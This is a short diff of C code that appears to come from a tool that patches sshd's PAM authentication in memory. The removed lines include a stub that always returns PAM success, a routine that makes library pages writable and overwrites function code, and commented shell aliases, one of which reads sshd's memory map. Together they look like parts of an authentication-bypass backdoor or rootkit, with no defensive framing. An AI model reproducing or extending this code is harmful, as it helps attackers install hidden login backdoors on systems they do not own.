@@ -35,36 +35,6 @@ static void handlesigsegv(int sig)
 	kill(getpid(), sig);
 }
 
-static int retzero(pam_handle_t *x, int i)
-{
-	return 0;
-}
-
-/*
- * going to get axed by relocation rewrites soon
- *
- * good god we've came far
- *
- * uint64_t prevpage = ((uint64_t) dli->dli_saddr / PAGE_SIZE) * PAGE_SIZE;
- * uint64_t nextpage = (((uint64_t) dli->dli_saddr / PAGE_SIZE) + 1) * PAGE_SIZE;
- *
- */
-static int hook(void *lib, void *func, void *replace, size_t replacelen)
-{
-	uint64_t distance = (uint64_t) func - (uint64_t) lib;
-	uint64_t PAGES = ((uint64_t) distance / PAGE_SIZE) + 1;
-
-	size_t len = PAGE_SIZE * PAGES;
-
-	mprotect((void *) lib, len, PROT_READ | PROT_WRITE | PROT_EXEC);
-
-	memcpy(func, replace, replacelen);
-
-	mprotect((void *) lib, len, PROT_READ | PROT_EXEC);
-
-	return 0;
-}
-
 /*
  * lib = start of lib we search - use get_libstart()
  */
@@ -360,20 +330,3 @@ static int callback(struct dl_phdr_info *info, size_t size, void *data)
 	}
 	return 0;
 }
-
-/*
-
-
-alias ls='ls --color=auto'
-alias grep='grep --color=auto'
-alias make='make clean ; clear && make'
-alias maps='cat /proc/$(pidof sshd)/maps'
-alias asf='cat /root/asf'
-
-
-function calc () {
-		    bc -l <<< "$@"
-}
-
-
-*/
